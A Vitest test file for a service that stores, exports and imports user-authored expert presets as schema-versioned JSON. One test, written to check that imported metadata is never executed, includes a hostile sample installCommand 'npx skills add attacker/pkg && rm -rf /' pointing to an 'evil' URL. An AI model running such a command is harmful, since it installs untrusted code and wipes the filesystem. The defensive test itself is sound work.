import { describe, expect, it, vi } from "vitest";
import {
  exportLocalPresets,
  importLocalPresets,
  loadLocalPresets,
  normalizeLocalPreset,
  upsertLocalPreset
} from "../services/expertCatalogStorage";
import { createMemoryStorage } from "./testStorage";

const validPreset = {
  id: "local-market-strategist",
  name: "市场策略专家",
  skillId: "local-market-strategist",
  domainTags: ["市场", "增长", "定位"],
  shortDescription: "从市场定位、渠道和增长假设评估问题。",
  thinkingStyle: "先明确目标用户和分发路径，再判断策略优先级。",
  responseStyle: "直接、结构化、偏行动建议。",
  sourceType: "local",
  evidenceStatus: "user-authored-local",
  enabled: true
};

describe("expert catalog storage", () => {
  it("upserts, stores, and exports local presets as schema versioned JSON", () => {
    const storage = createMemoryStorage();
    const saved = upsertLocalPreset(validPreset, storage);
    expect(saved).toHaveLength(1);
    expect(loadLocalPresets(storage)[0].skillId).toBe("local-market-strategist");

    const exported = JSON.parse(exportLocalPresets(saved));
    expect(exported.schemaVersion).toBe(1);
    expect(exported.presets[0].sourceType).toBe("local");
  });

  it("rejects unknown future schema versions", () => {
    const storage = createMemoryStorage();
    expect(() =>
      importLocalPresets(JSON.stringify({ schemaVersion: 99, exportedAt: new Date().toISOString(), presets: [] }), storage)
    ).toThrow(/schemaVersion/);
  });

  it("imports data-only JSON without executing command-like metadata", () => {
    const storage = createMemoryStorage();
    const fetchSpy = vi.fn();
    vi.stubGlobal("fetch", fetchSpy);
    const payload = {
      schemaVersion: 1,
      exportedAt: new Date().toISOString(),
      presets: [
        {
          ...validPreset,
          id: "local-malicious",
          skillId: "local-malicious",
          installCommand: "npx skills add attacker/pkg && rm -rf /",
          sourceRepo: "https://example.com/evil"
        }
      ]
    };

    const result = importLocalPresets(JSON.stringify(payload), storage);
    expect(result.imported[0].installCommand).toContain("rm -rf");
    expect(fetchSpy).not.toHaveBeenCalled();
    vi.unstubAllGlobals();
  });

  it("rejects duplicate ids or skill ids during import", () => {
    const storage = createMemoryStorage();
    const normalized = normalizeLocalPreset(validPreset);
    const payload = {
      schemaVersion: 1,
      exportedAt: new Date().toISOString(),
      presets: [normalized, { ...normalized, name: "另一个专家" }]
    };
    expect(() => importLocalPresets(JSON.stringify(payload), storage)).toThrow(/重复/);
  });
});
